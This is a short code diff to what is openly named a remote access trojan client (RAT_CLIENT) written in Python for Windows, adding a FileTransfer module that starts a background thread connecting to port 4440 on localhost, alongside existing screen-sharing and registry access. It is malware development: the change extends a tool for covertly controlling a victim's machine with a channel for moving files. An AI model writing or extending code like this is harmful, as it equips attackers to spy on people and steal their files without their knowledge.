@@ -17,6 +17,7 @@ import io
 import time
 import winreg as reg
 from modules.screenshare import ScreenShare
+from modules.filetransfer import FileTransfer
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -69,6 +70,15 @@ class RAT_CLIENT:
         self.command_history = []
 
         self.screenshareClient = ScreenShare()
+
+        self.file_transfer_manager = FileTransfer(
+            "localhost", 4440
+        )
+
+        self.file_transfer_thread = Thread(
+            target=self.file_transfer_manager.connect
+        )
+        self.file_transfer_thread.start()
 
     def build_connection(self):
         global s
